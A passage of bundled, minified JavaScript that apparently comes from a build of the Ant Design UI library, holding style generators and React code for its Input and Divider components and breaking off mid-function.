    "&:placeholder-shown": { textOverflow: "ellipsis" },
  }),
  genInputLargeStyle = (i) => {
    const {
      paddingBlockLG: a,
      lineHeightLG: o,
      borderRadiusLG: s,
      paddingInlineLG: tt,
    } = i;
    return {
      padding: `${unit$1(a)} ${unit$1(tt)}`,
      fontSize: i.inputFontSizeLG,
      lineHeight: o,
      borderRadius: s,
    };
  },
  genInputSmallStyle = (i) => ({
    padding: `${unit$1(i.paddingBlockSM)} ${unit$1(i.paddingInlineSM)}`,
    fontSize: i.inputFontSizeSM,
    borderRadius: i.borderRadiusSM,
  }),
  genBasicInputStyle = (i) =>
    Object.assign(
      Object.assign(
        {
          position: "relative",
          display: "inline-block",
          width: "100%",
          minWidth: 0,
          padding: `${unit$1(i.paddingBlock)} ${unit$1(i.paddingInline)}`,
          color: i.colorText,
          fontSize: i.inputFontSize,
          lineHeight: i.lineHeight,
          borderRadius: i.borderRadius,
          transition: `all ${i.motionDurationMid}`,
        },
        genPlaceholderStyle(i.colorTextPlaceholder)
      ),
      {
        "textarea&": {
          maxWidth: "100%",
          height: "auto",
          minHeight: i.controlHeight,
          lineHeight: i.lineHeight,
          verticalAlign: "bottom",
          transition: `all ${i.motionDurationSlow}, height 0s`,
          resize: "vertical",
        },
        "&-lg": Object.assign({}, genInputLargeStyle(i)),
        "&-sm": Object.assign({}, genInputSmallStyle(i)),
        "&-rtl, &-textarea-rtl": { direction: "rtl" },
      }
    ),
  genInputGroupStyle = (i) => {
    const { componentCls: a, antCls: o } = i;
    return {
      position: "relative",
      display: "table",
      width: "100%",
      borderCollapse: "separate",
      borderSpacing: 0,
      "&[class*='col-']": {
        paddingInlineEnd: i.paddingXS,
        "&:last-child": { paddingInlineEnd: 0 },
      },
      [`&-lg ${a}, &-lg > ${a}-group-addon`]: Object.assign(
        {},
        genInputLargeStyle(i)
      ),
      [`&-sm ${a}, &-sm > ${a}-group-addon`]: Object.assign(
        {},
        genInputSmallStyle(i)
      ),
      [`&-lg ${o}-select-single ${o}-select-selector`]: {
        height: i.controlHeightLG,
      },
      [`&-sm ${o}-select-single ${o}-select-selector`]: {
        height: i.controlHeightSM,
      },
      [`> ${a}`]: {
        display: "table-cell",
        "&:not(:first-child):not(:last-child)": { borderRadius: 0 },
      },
      [`${a}-group`]: {
        "&-addon, &-wrap": {
          display: "table-cell",
          width: 1,
          whiteSpace: "nowrap",
          verticalAlign: "middle",
          "&:not(:first-child):not(:last-child)": { borderRadius: 0 },
        },
        "&-wrap > *": { display: "block !important" },
        "&-addon": {
          position: "relative",
          padding: `0 ${unit$1(i.paddingInline)}`,
          color: i.colorText,
          fontWeight: "normal",
          fontSize: i.inputFontSize,
          textAlign: "center",
          borderRadius: i.borderRadius,
          transition: `all ${i.motionDurationSlow}`,
          lineHeight: 1,
          [`${o}-select`]: {
            margin: `${unit$1(
              i.calc(i.paddingBlock).add(1).mul(-1).equal()
            )} ${unit$1(i.calc(i.paddingInline).mul(-1).equal())}`,
            [`&${o}-select-single:not(${o}-select-customize-input):not(${o}-pagination-size-changer)`]:
              {
                [`${o}-select-selector`]: {
                  backgroundColor: "inherit",
                  border: `${unit$1(i.lineWidth)} ${i.lineType} transparent`,
                  boxShadow: "none",
                },
              },
          },
          [`${o}-cascader-picker`]: {
            margin: `-9px ${unit$1(i.calc(i.paddingInline).mul(-1).equal())}`,
            backgroundColor: "transparent",
            [`${o}-cascader-input`]: {
              textAlign: "start",
              border: 0,
              boxShadow: "none",
            },
          },
        },
      },
      [a]: {
        width: "100%",
        marginBottom: 0,
        textAlign: "inherit",
        "&:focus": { zIndex: 1, borderInlineEndWidth: 1 },
        "&:hover": {
          zIndex: 1,
          borderInlineEndWidth: 1,
          [`${a}-search-with-button &`]: { zIndex: 0 },
        },
      },
      [`> ${a}:first-child, ${a}-group-addon:first-child`]: {
        borderStartEndRadius: 0,
        borderEndEndRadius: 0,
        [`${o}-select ${o}-select-selector`]: {
          borderStartEndRadius: 0,
          borderEndEndRadius: 0,
        },
      },
      [`> ${a}-affix-wrapper`]: {
        [`&:not(:first-child) ${a}`]: {
          borderStartStartRadius: 0,
          borderEndStartRadius: 0,
        },
        [`&:not(:last-child) ${a}`]: {
          borderStartEndRadius: 0,
          borderEndEndRadius: 0,
        },
      },
      [`> ${a}:last-child, ${a}-group-addon:last-child`]: {
        borderStartStartRadius: 0,
        borderEndStartRadius: 0,
        [`${o}-select ${o}-select-selector`]: {
          borderStartStartRadius: 0,
          borderEndStartRadius: 0,
        },
      },
      [`${a}-affix-wrapper`]: {
        "&:not(:last-child)": {
          borderStartEndRadius: 0,
          borderEndEndRadius: 0,
          [`${a}-search &`]: {
            borderStartStartRadius: i.borderRadius,
            borderEndStartRadius: i.borderRadius,
          },
        },
        [`&:not(:first-child), ${a}-search &:not(:first-child)`]: {
          borderStartStartRadius: 0,
          borderEndStartRadius: 0,
        },
      },
      [`&${a}-group-compact`]: Object.assign(
        Object.assign({ display: "block" }, clearFix()),
        {
          [`${a}-group-addon, ${a}-group-wrap, > ${a}`]: {
            "&:not(:first-child):not(:last-child)": {
              borderInlineEndWidth: i.lineWidth,
              "&:hover, &:focus": { zIndex: 1 },
            },
          },
          "& > *": {
            display: "inline-flex",
            float: "none",
            verticalAlign: "top",
            borderRadius: 0,
          },
          [`
        & > ${a}-affix-wrapper,
        & > ${a}-number-affix-wrapper,
        & > ${o}-picker-range
      `]: { display: "inline-flex" },
          "& > *:not(:last-child)": {
            marginInlineEnd: i.calc(i.lineWidth).mul(-1).equal(),
            borderInlineEndWidth: i.lineWidth,
          },
          [a]: { float: "none" },
          [`& > ${o}-select > ${o}-select-selector,
      & > ${o}-select-auto-complete ${a},
      & > ${o}-cascader-picker ${a},
      & > ${a}-group-wrapper ${a}`]: {
            borderInlineEndWidth: i.lineWidth,
            borderRadius: 0,
            "&:hover, &:focus": { zIndex: 1 },
          },
          [`& > ${o}-select-focused`]: { zIndex: 1 },
          [`& > ${o}-select > ${o}-select-arrow`]: { zIndex: 1 },
          [`& > *:first-child,
      & > ${o}-select:first-child > ${o}-select-selector,
      & > ${o}-select-auto-complete:first-child ${a},
      & > ${o}-cascader-picker:first-child ${a}`]: {
            borderStartStartRadius: i.borderRadius,
            borderEndStartRadius: i.borderRadius,
          },
          [`& > *:last-child,
      & > ${o}-select:last-child > ${o}-select-selector,
      & > ${o}-cascader-picker:last-child ${a},
      & > ${o}-cascader-picker-focused:last-child ${a}`]: {
            borderInlineEndWidth: i.lineWidth,
            borderStartEndRadius: i.borderRadius,
            borderEndEndRadius: i.borderRadius,
          },
          [`& > ${o}-select-auto-complete ${a}`]: { verticalAlign: "top" },
          [`${a}-group-wrapper + ${a}-group-wrapper`]: {
            marginInlineStart: i.calc(i.lineWidth).mul(-1).equal(),
            [`${a}-affix-wrapper`]: { borderRadius: 0 },
          },
          [`${a}-group-wrapper:not(:last-child)`]: {
            [`&${a}-search > ${a}-group`]: {
              [`& > ${a}-group-addon > ${a}-search-button`]: {
                borderRadius: 0,
              },
              [`& > ${a}`]: {
                borderStartStartRadius: i.borderRadius,
                borderStartEndRadius: 0,
                borderEndEndRadius: 0,
                borderEndStartRadius: i.borderRadius,
              },
            },
          },
        }
      ),
    };
  },
  genInputStyle = (i) => {
    const { componentCls: a, controlHeightSM: o, lineWidth: s, calc: tt } = i,
      ot = tt(o).sub(tt(s).mul(2)).sub(16).div(2).equal();
    return {
      [a]: Object.assign(
        Object.assign(
          Object.assign(
            Object.assign(
              Object.assign(
                Object.assign({}, resetComponent(i)),
                genBasicInputStyle(i)
              ),
              genOutlinedStyle(i)
            ),
            genFilledStyle(i)
          ),
          genBorderlessStyle(i)
        ),
        {
          '&[type="color"]': {
            height: i.controlHeight,
            [`&${a}-lg`]: { height: i.controlHeightLG },
            [`&${a}-sm`]: { height: o, paddingTop: ot, paddingBottom: ot },
          },
          '&[type="search"]::-webkit-search-cancel-button, &[type="search"]::-webkit-search-decoration':
            { "-webkit-appearance": "none" },
        }
      ),
    };
  },
  genAllowClearStyle = (i) => {
    const { componentCls: a } = i;
    return {
      [`${a}-clear-icon`]: {
        margin: 0,
        lineHeight: 0,
        color: i.colorTextQuaternary,
        fontSize: i.fontSizeIcon,
        verticalAlign: -1,
        cursor: "pointer",
        transition: `color ${i.motionDurationSlow}`,
        "&:hover": { color: i.colorTextTertiary },
        "&:active": { color: i.colorText },
        "&-hidden": { visibility: "hidden" },
        "&-has-suffix": { margin: `0 ${unit$1(i.inputAffixPadding)}` },
      },
    };
  },
  genAffixStyle = (i) => {
    const {
        componentCls: a,
        inputAffixPadding: o,
        colorTextDescription: s,
        motionDurationSlow: tt,
        colorIcon: nt,
        colorIconHover: ot,
        iconCls: st,
      } = i,
      ft = `${a}-affix-wrapper`,
      ht = `${a}-affix-wrapper-disabled`;
    return {
      [ft]: Object.assign(
        Object.assign(
          Object.assign(Object.assign({}, genBasicInputStyle(i)), {
            display: "inline-flex",
            [`&:not(${a}-disabled):hover`]: {
              zIndex: 1,
              [`${a}-search-with-button &`]: { zIndex: 0 },
            },
            "&-focused, &:focus": { zIndex: 1 },
            [`> input${a}`]: { padding: 0 },
            [`> input${a}, > textarea${a}`]: {
              fontSize: "inherit",
              border: "none",
              borderRadius: 0,
              outline: "none",
              background: "transparent",
              color: "inherit",
              "&::-ms-reveal": { display: "none" },
              "&:focus": { boxShadow: "none !important" },
            },
            "&::before": {
              display: "inline-block",
              width: 0,
              visibility: "hidden",
              content: '"\\a0"',
            },
            [a]: {
              "&-prefix, &-suffix": {
                display: "flex",
                flex: "none",
                alignItems: "center",
                "> *:not(:last-child)": { marginInlineEnd: i.paddingXS },
              },
              "&-show-count-suffix": { color: s },
              "&-show-count-has-suffix": { marginInlineEnd: i.paddingXXS },
              "&-prefix": { marginInlineEnd: o },
              "&-suffix": { marginInlineStart: o },
            },
          }),
          genAllowClearStyle(i)
        ),
        {
          [`${st}${a}-password-icon`]: {
            color: nt,
            cursor: "pointer",
            transition: `all ${tt}`,
            "&:hover": { color: ot },
          },
        }
      ),
      [ht]: {
        [`${st}${a}-password-icon`]: {
          color: nt,
          cursor: "not-allowed",
          "&:hover": { color: nt },
        },
      },
    };
  },
  genGroupStyle = (i) => {
    const { componentCls: a, borderRadiusLG: o, borderRadiusSM: s } = i;
    return {
      [`${a}-group`]: Object.assign(
        Object.assign(
          Object.assign({}, resetComponent(i)),
          genInputGroupStyle(i)
        ),
        {
          "&-rtl": { direction: "rtl" },
          "&-wrapper": Object.assign(
            Object.assign(
              Object.assign(
                {
                  display: "inline-block",
                  width: "100%",
                  textAlign: "start",
                  verticalAlign: "top",
                  "&-rtl": { direction: "rtl" },
                  "&-lg": {
                    [`${a}-group-addon`]: {
                      borderRadius: o,
                      fontSize: i.inputFontSizeLG,
                    },
                  },
                  "&-sm": { [`${a}-group-addon`]: { borderRadius: s } },
                },
                genOutlinedGroupStyle(i)
              ),
              genFilledGroupStyle(i)
            ),
            {
              [`&:not(${a}-compact-first-item):not(${a}-compact-last-item)${a}-compact-item`]:
                { [`${a}, ${a}-group-addon`]: { borderRadius: 0 } },
              [`&:not(${a}-compact-last-item)${a}-compact-first-item`]: {
                [`${a}, ${a}-group-addon`]: {
                  borderStartEndRadius: 0,
                  borderEndEndRadius: 0,
                },
              },
              [`&:not(${a}-compact-first-item)${a}-compact-last-item`]: {
                [`${a}, ${a}-group-addon`]: {
                  borderStartStartRadius: 0,
                  borderEndStartRadius: 0,
                },
              },
              [`&:not(${a}-compact-last-item)${a}-compact-item`]: {
                [`${a}-affix-wrapper`]: {
                  borderStartEndRadius: 0,
                  borderEndEndRadius: 0,
                },
              },
            }
          ),
        }
      ),
    };
  },
  genSearchInputStyle = (i) => {
    const { componentCls: a, antCls: o } = i,
      s = `${a}-search`;
    return {
      [s]: {
        [a]: {
          "&:hover, &:focus": {
            [`+ ${a}-group-addon ${s}-button:not(${o}-btn-primary)`]: {
              borderInlineStartColor: i.colorPrimaryHover,
            },
          },
        },
        [`${a}-affix-wrapper`]: { height: i.controlHeight, borderRadius: 0 },
        [`${a}-lg`]: { lineHeight: i.calc(i.lineHeightLG).sub(2e-4).equal() },
        [`> ${a}-group`]: {
          [`> ${a}-group-addon:last-child`]: {
            insetInlineStart: -1,
            padding: 0,
            border: 0,
            [`${s}-button`]: {
              marginInlineEnd: -1,
              borderStartStartRadius: 0,
              borderEndStartRadius: 0,
              boxShadow: "none",
            },
            [`${s}-button:not(${o}-btn-primary)`]: {
              color: i.colorTextDescription,
              "&:hover": { color: i.colorPrimaryHover },
              "&:active": { color: i.colorPrimaryActive },
              [`&${o}-btn-loading::before`]: {
                insetInlineStart: 0,
                insetInlineEnd: 0,
                insetBlockStart: 0,
                insetBlockEnd: 0,
              },
            },
          },
        },
        [`${s}-button`]: {
          height: i.controlHeight,
          "&:hover, &:focus": { zIndex: 1 },
        },
        "&-large": {
          [`${a}-affix-wrapper, ${s}-button`]: { height: i.controlHeightLG },
        },
        "&-small": {
          [`${a}-affix-wrapper, ${s}-button`]: { height: i.controlHeightSM },
        },
        "&-rtl": { direction: "rtl" },
        [`&${a}-compact-item`]: {
          [`&:not(${a}-compact-last-item)`]: {
            [`${a}-group-addon`]: {
              [`${a}-search-button`]: {
                marginInlineEnd: i.calc(i.lineWidth).mul(-1).equal(),
                borderRadius: 0,
              },
            },
          },
          [`&:not(${a}-compact-first-item)`]: {
            [`${a},${a}-affix-wrapper`]: { borderRadius: 0 },
          },
          [`> ${a}-group-addon ${a}-search-button,
        > ${a},
        ${a}-affix-wrapper`]: { "&:hover, &:focus, &:active": { zIndex: 2 } },
          [`> ${a}-affix-wrapper-focused`]: { zIndex: 2 },
        },
      },
    };
  },
  genTextAreaStyle = (i) => {
    const { componentCls: a, paddingLG: o } = i,
      s = `${a}-textarea`;
    return {
      [s]: {
        position: "relative",
        "&-show-count": {
          [`> ${a}`]: { height: "100%" },
          [`${a}-data-count`]: {
            position: "absolute",
            bottom: i.calc(i.fontSize).mul(i.lineHeight).mul(-1).equal(),
            insetInlineEnd: 0,
            color: i.colorTextDescription,
            whiteSpace: "nowrap",
            pointerEvents: "none",
          },
        },
        [`
        &-allow-clear > ${a},
        &-affix-wrapper${s}-has-feedback ${a}
      `]: { paddingInlineEnd: o },
        [`&-affix-wrapper${a}-affix-wrapper`]: {
          padding: 0,
          [`> textarea${a}`]: {
            fontSize: "inherit",
            border: "none",
            outline: "none",
            background: "transparent",
            "&:focus": { boxShadow: "none !important" },
          },
          [`${a}-suffix`]: {
            margin: 0,
            "> *:not(:last-child)": { marginInline: 0 },
            [`${a}-clear-icon`]: {
              position: "absolute",
              insetInlineEnd: i.paddingInline,
              insetBlockStart: i.paddingXS,
            },
            [`${s}-suffix`]: {
              position: "absolute",
              top: 0,
              insetInlineEnd: i.paddingInline,
              bottom: 0,
              zIndex: 1,
              display: "inline-flex",
              alignItems: "center",
              margin: "auto",
              pointerEvents: "none",
            },
          },
        },
        [`&-affix-wrapper${a}-affix-wrapper-sm`]: {
          [`${a}-suffix`]: {
            [`${a}-clear-icon`]: { insetInlineEnd: i.paddingInlineSM },
          },
        },
      },
    };
  },
  genRangeStyle = (i) => {
    const { componentCls: a } = i;
    return {
      [`${a}-out-of-range`]: {
        [`&, & input, & textarea, ${a}-show-count-suffix, ${a}-data-count`]: {
          color: i.colorError,
        },
      },
    };
  },
  useStyle$2 = genStyleHooks(
    "Input",
    (i) => {
      const a = merge(i, initInputToken(i));
      return [
        genInputStyle(a),
        genTextAreaStyle(a),
        genAffixStyle(a),
        genGroupStyle(a),
        genSearchInputStyle(a),
        genRangeStyle(a),
        genCompactItemStyle(a),
      ];
    },
    initComponentToken,
    { resetFont: !1 }
  ),
  genSharedDividerStyle = (i) => {
    const {
      componentCls: a,
      sizePaddingEdgeHorizontal: o,
      colorSplit: s,
      lineWidth: tt,
      textPaddingInline: nt,
      orientationMargin: ot,
      verticalMarginInline: st,
    } = i;
    return {
      [a]: Object.assign(Object.assign({}, resetComponent(i)), {
        borderBlockStart: `${unit$1(tt)} solid ${s}`,
        "&-vertical": {
          position: "relative",
          top: "-0.06em",
          display: "inline-block",
          height: "0.9em",
          marginInline: st,
          marginBlock: 0,
          verticalAlign: "middle",
          borderTop: 0,
          borderInlineStart: `${unit$1(tt)} solid ${s}`,
        },
        "&-horizontal": {
          display: "flex",
          clear: "both",
          width: "100%",
          minWidth: "100%",
          margin: `${unit$1(i.dividerHorizontalGutterMargin)} 0`,
        },
        [`&-horizontal${a}-with-text`]: {
          display: "flex",
          alignItems: "center",
          margin: `${unit$1(i.dividerHorizontalWithTextGutterMargin)} 0`,
          color: i.colorTextHeading,
          fontWeight: 500,
          fontSize: i.fontSizeLG,
          whiteSpace: "nowrap",
          textAlign: "center",
          borderBlockStart: `0 ${s}`,
          "&::before, &::after": {
            position: "relative",
            width: "50%",
            borderBlockStart: `${unit$1(tt)} solid transparent`,
            borderBlockStartColor: "inherit",
            borderBlockEnd: 0,
            transform: "translateY(50%)",
            content: "''",
          },
        },
        [`&-horizontal${a}-with-text-left`]: {
          "&::before": { width: `calc(${ot} * 100%)` },
          "&::after": { width: `calc(100% - ${ot} * 100%)` },
        },
        [`&-horizontal${a}-with-text-right`]: {
          "&::before": { width: `calc(100% - ${ot} * 100%)` },
          "&::after": { width: `calc(${ot} * 100%)` },
        },
        [`${a}-inner-text`]: {
          display: "inline-block",
          paddingBlock: 0,
          paddingInline: nt,
        },
        "&-dashed": {
          background: "none",
          borderColor: s,
          borderStyle: "dashed",
          borderWidth: `${unit$1(tt)} 0 0`,
        },
        [`&-horizontal${a}-with-text${a}-dashed`]: {
          "&::before, &::after": { borderStyle: "dashed none none" },
        },
        [`&-vertical${a}-dashed`]: {
          borderInlineStartWidth: tt,
          borderInlineEnd: 0,
          borderBlockStart: 0,
          borderBlockEnd: 0,
        },
        "&-dotted": {
          background: "none",
          borderColor: s,
          borderStyle: "dotted",
          borderWidth: `${unit$1(tt)} 0 0`,
        },
        [`&-horizontal${a}-with-text${a}-dotted`]: {
          "&::before, &::after": { borderStyle: "dotted none none" },
        },
        [`&-vertical${a}-dotted`]: {
          borderInlineStartWidth: tt,
          borderInlineEnd: 0,
          borderBlockStart: 0,
          borderBlockEnd: 0,
        },
        [`&-plain${a}-with-text`]: {
          color: i.colorText,
          fontWeight: "normal",
          fontSize: i.fontSize,
        },
        [`&-horizontal${a}-with-text-left${a}-no-default-orientation-margin-left`]:
          {
            "&::before": { width: 0 },
            "&::after": { width: "100%" },
            [`${a}-inner-text`]: { paddingInlineStart: o },
          },
        [`&-horizontal${a}-with-text-right${a}-no-default-orientation-margin-right`]:
          {
            "&::before": { width: "100%" },
            "&::after": { width: 0 },
            [`${a}-inner-text`]: { paddingInlineEnd: o },
          },
      }),
    };
  },
  prepareComponentToken = (i) => ({
    textPaddingInline: "1em",
    orientationMargin: 0.05,
    verticalMarginInline: i.marginXS,
  }),
  useStyle$1 = genStyleHooks(
    "Divider",
    (i) => {
      const a = merge(i, {
        dividerHorizontalWithTextGutterMargin: i.margin,
        dividerHorizontalGutterMargin: i.marginLG,
        sizePaddingEdgeHorizontal: 0,
      });
      return [genSharedDividerStyle(a)];
    },
    prepareComponentToken,
    { unitless: { orientationMargin: !0 } }
  );
var __rest$6 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const Divider = (i) => {
  const {
      getPrefixCls: a,
      direction: o,
      divider: s,
    } = reactExports.useContext(ConfigContext),
    {
      prefixCls: tt,
      type: nt = "horizontal",
      orientation: ot = "center",
      orientationMargin: st,
      className: ft,
      rootClassName: ht,
      children: gt,
      dashed: St,
      variant: vt = "solid",
      plain: _t,
      style: Et,
    } = i,
    Ct = __rest$6(i, [
      "prefixCls",
      "type",
      "orientation",
      "orientationMargin",
      "className",
      "rootClassName",
      "children",
      "dashed",
      "variant",
      "plain",
      "style",
    ]),
    Pt = a("divider", tt),
    [bt, xt, yt] = useStyle$1(Pt),
    wt = !!gt,
    $t = ot === "left" && st != null,
    kt = ot === "right" && st != null,
    Rt = classNames(
      Pt,
      s == null ? void 0 : s.className,
      xt,
      yt,
      `${Pt}-${nt}`,
      {
        [`${Pt}-with-text`]: wt,
        [`${Pt}-with-text-${ot}`]: wt,
        [`${Pt}-dashed`]: !!St,
        [`${Pt}-${vt}`]: vt !== "solid",
        [`${Pt}-plain`]: !!_t,
        [`${Pt}-rtl`]: o === "rtl",
        [`${Pt}-no-default-orientation-margin-left`]: $t,
        [`${Pt}-no-default-orientation-margin-right`]: kt,
      },
      ft,
      ht
    ),
    It = reactExports.useMemo(
      () => (typeof st == "number" ? st : /^\d+$/.test(st) ? Number(st) : st),
      [st]
    ),
    Ot = Object.assign(
      Object.assign({}, $t && { marginLeft: It }),
      kt && { marginRight: It }
    );
  return bt(
    reactExports.createElement(
      "div",
      Object.assign(
        {
          className: Rt,
          style: Object.assign(
            Object.assign({}, s == null ? void 0 : s.style),
            Et
          ),
        },
        Ct,
        { role: "separator" }
      ),
      gt &&
        nt !== "vertical" &&
        reactExports.createElement(
          "span",
          { className: `${Pt}-inner-text`, style: Ot },
          gt
        )
    )
  );
};
function hasAddon(i) {
  return !!(i.addonBefore || i.addonAfter);
}
function hasPrefixSuffix$1(i) {
  return !!(i.prefix || i.suffix || i.allowClear);
}
function cloneEvent(i, a, o) {
  var s = a.cloneNode(!0),
    tt = Object.create(i, {
      target: { value: s },
      currentTarget: { value: s },
    });
  return (
    (s.value = o),
    typeof a.selectionStart == "number" &&
      typeof a.selectionEnd == "number" &&
      ((s.selectionStart = a.selectionStart),
      (s.selectionEnd = a.selectionEnd)),
    (s.setSelectionRange = function () {
      a.setSelectionRange.apply(a, arguments);
    }),
    tt
  );
}
function resolveOnChange(i, a, o, s) {
  if (o) {
    var tt = a;
    if (a.type === "click") {
      (tt = cloneEvent(a, i, "")), o(tt);
      return;
    }
    if (i.type !== "file" && s !== void 0) {
      (tt = cloneEvent(a, i, s)), o(tt);
      return;
    }
    o(tt);
  }
}
function triggerFocus(i, a) {
  if (i) {
    i.focus(a);
    var o = a || {},
      s = o.cursor;
    if (s) {
      var tt = i.value.length;
      switch (s) {
        case "start":
          i.setSelectionRange(0, 0);
          break;
        case "end":
          i.setSelectionRange(tt, tt);
          break;
        default:
          i.setSelectionRange(0, tt);
      }
    }
  }
}
var BaseInput = React$1.forwardRef(function (i, a) {
    var o,
      s,
      tt = i.inputElement,
      nt = i.children,
      ot = i.prefixCls,
      st = i.prefix,
      ft = i.suffix,
      ht = i.addonBefore,
      gt = i.addonAfter,
      St = i.className,
      vt = i.style,
      _t = i.disabled,
      Et = i.readOnly,
      Ct = i.focused,
      Pt = i.triggerFocus,
      bt = i.allowClear,
      xt = i.value,
      yt = i.handleReset,
      wt = i.hidden,
      $t = i.classes,
      kt = i.classNames,
      Rt = i.dataAttrs,
      It = i.styles,
      Ot = i.components,
      Nt = i.onClear,
      zt = nt ?? tt,
      Bt = (Ot == null ? void 0 : Ot.affixWrapper) || "span",
      Wt = (Ot == null ? void 0 : Ot.groupWrapper) || "span",
      Gt = (Ot == null ? void 0 : Ot.wrapper) || "span",
      Vt = (Ot == null ? void 0 : Ot.groupAddon) || "span",
      Mt = reactExports.useRef(null),
      Ft = function (Xt) {
        var hr;
        (hr = Mt.current) !== null &&
          hr !== void 0 &&
          hr.contains(Xt.target) &&
          (Pt == null || Pt());
      },
      Tt = hasPrefixSuffix$1(i),
      At = reactExports.cloneElement(zt, {
        value: xt,
        className:
          classNames(
            zt.props.className,
            !Tt && (kt == null ? void 0 : kt.variant)
          ) || null,
      }),
      Lt = reactExports.useRef(null);
    if (
      (React$1.useImperativeHandle(a, function () {
        return { nativeElement: Lt.current || Mt.current };
      }),
      Tt)
    ) {
      var jt = null;
      if (bt) {
        var Dt = !_t && !Et && xt,
          Ut = "".concat(ot, "-clear-icon"),
          Ht =
            _typeof(bt) === "object" &&
            bt !== null &&
            bt !== void 0 &&
            bt.clearIcon
              ? bt.clearIcon
              : "✖";
        jt = React$1.createElement(
          "span",
          {
            onClick: function (Xt) {
              yt == null || yt(Xt), Nt == null || Nt();
            },
            onMouseDown: function (Xt) {
              return Xt.preventDefault();
            },
            className: classNames(
              Ut,
              _defineProperty$1(
                _defineProperty$1({}, "".concat(Ut, "-hidden"), !Dt),
                "".concat(Ut, "-has-suffix"),
                !!ft
              )
            ),
            role: "button",
            tabIndex: -1,
          },
          Ht
        );
      }
      var Kt = "".concat(ot, "-affix-wrapper"),
        qt = classNames(
          Kt,
          _defineProperty$1(
            _defineProperty$1(
              _defineProperty$1(
                _defineProperty$1(
                  _defineProperty$1({}, "".concat(ot, "-disabled"), _t),
                  "".concat(Kt, "-disabled"),
                  _t
                ),
                "".concat(Kt, "-focused"),
                Ct
              ),
              "".concat(Kt, "-readonly"),
              Et
            ),
            "".concat(Kt, "-input-with-clear-btn"),
            ft && bt && xt
          ),
          $t == null ? void 0 : $t.affixWrapper,
          kt == null ? void 0 : kt.affixWrapper,
          kt == null ? void 0 : kt.variant
        ),
        Qt =
          (ft || bt) &&
          React$1.createElement(
            "span",
            {
              className: classNames(
                "".concat(ot, "-suffix"),
                kt == null ? void 0 : kt.suffix
              ),
              style: It == null ? void 0 : It.suffix,
            },
            jt,
            ft
          );
      At = React$1.createElement(
        Bt,
        _extends(
          {
            className: qt,
            style: It == null ? void 0 : It.affixWrapper,
            onClick: Ft,
          },
          Rt == null ? void 0 : Rt.affixWrapper,
          { ref: Mt }
        ),
        st &&
          React$1.createElement(
            "span",
            {
              className: classNames(
                "".concat(ot, "-prefix"),
                kt == null ? void 0 : kt.prefix
              ),
              style: It == null ? void 0 : It.prefix,
            },
            st
          ),
        At,
        Qt
      );
    }
    if (hasAddon(i)) {
      var Zt = "".concat(ot, "-group"),
        Jt = "".concat(Zt, "-addon"),
        er = "".concat(Zt, "-wrapper"),
        sr = classNames(
          "".concat(ot, "-wrapper"),
          Zt,
          $t == null ? void 0 : $t.wrapper,
          kt == null ? void 0 : kt.wrapper
        ),
        nr = classNames(
          er,
          _defineProperty$1({}, "".concat(er, "-disabled"), _t),
          $t == null ? void 0 : $t.group,
          kt == null ? void 0 : kt.groupWrapper
        );
      At = React$1.createElement(
        Wt,
        { className: nr, ref: Lt },
        React$1.createElement(
          Gt,
          { className: sr },
          ht && React$1.createElement(Vt, { className: Jt }, ht),
          At,
          gt && React$1.createElement(Vt, { className: Jt }, gt)
        )
      );
    }
    return React$1.cloneElement(At, {
      className:
        classNames(
          (o = At.props) === null || o === void 0 ? void 0 : o.className,
          St
        ) || null,
      style: _objectSpread2$1(
        _objectSpread2$1(
          {},
          (s = At.props) === null || s === void 0 ? void 0 : s.style
        ),
        vt
      ),
      hidden: wt,
    });
  }),
  _excluded$5 = ["show"];
function useCount(i, a) {
  return reactExports.useMemo(
    function () {
      var o = {};
      a &&
        (o.show = _typeof(a) === "object" && a.formatter ? a.formatter : !!a),
        (o = _objectSpread2$1(_objectSpread2$1({}, o), i));
      var s = o,
        tt = s.show,
        nt = _objectWithoutProperties$1(s, _excluded$5);
      return _objectSpread2$1(
        _objectSpread2$1({}, nt),
        {},
        {
          show: !!tt,
          showFormatter: typeof tt == "function" ? tt : void 0,
          strategy:
            nt.strategy ||
            function (ot) {
              return ot.length;
            },
        }
      );
    },
    [i, a]
  );
}
var _excluded$4 = [
    "autoComplete",
    "onChange",
    "onFocus",
    "onBlur",
    "onPressEnter",
    "onKeyDown",
    "onKeyUp",
    "prefixCls",
    "disabled",
    "htmlSize",
    "className",
    "maxLength",
    "suffix",
    "showCount",
    "count",
    "type",
    "classes",
    "classNames",
    "styles",
    "onCompositionStart",
    "onCompositionEnd",
  ],
  Input$2 = reactExports.forwardRef(function (i, a) {
    var o = i.autoComplete,
      s = i.onChange,
      tt = i.onFocus,
      nt = i.onBlur,
      ot = i.onPressEnter,
      st = i.onKeyDown,
      ft = i.onKeyUp,
      ht = i.prefixCls,
      gt = ht === void 0 ? "rc-input" : ht,
      St = i.disabled,
      vt = i.htmlSize,
      _t = i.className,
      Et = i.maxLength,
      Ct = i.suffix,
      Pt = i.showCount,
      bt = i.count,
      xt = i.type,
      yt = xt === void 0 ? "text" : xt,
      wt = i.classes,
      $t = i.classNames,
      kt = i.styles,
      Rt = i.onCompositionStart,
      It = i.onCompositionEnd,
      Ot = _objectWithoutProperties$1(i, _excluded$4),
      Nt = reactExports.useState(!1),
      zt = _slicedToArray$1(Nt, 2),
      Bt = zt[0],
      Wt = zt[1],
      Gt = reactExports.useRef(!1),
      Vt = reactExports.useRef(!1),
      Mt = reactExports.useRef(null),
      Ft = reactExports.useRef(null),
      Tt = function (rr) {
        Mt.current && triggerFocus(Mt.current, rr);
      },
      At = useMergedState(i.defaultValue, { value: i.value }),
      Lt = _slicedToArray$1(At, 2),
      jt = Lt[0],
      Dt = Lt[1],
      Ut = jt == null ? "" : String(jt),
      Ht = reactExports.useState(null),
      Kt = _slicedToArray$1(Ht, 2),
      qt = Kt[0],
      Qt = Kt[1],
      Zt = useCount(bt, Pt),
      Jt = Zt.max || Et,
      er = Zt.strategy(Ut),
      sr = !!Jt && er > Jt;
    reactExports.useImperativeHandle(a, function () {
      var Yt;
      return {
        focus: Tt,
        blur: function () {
          var ar;
          (ar = Mt.current) === null || ar === void 0 || ar.blur();
        },
        setSelectionRange: function (ar, gr, br) {
          var Cr;
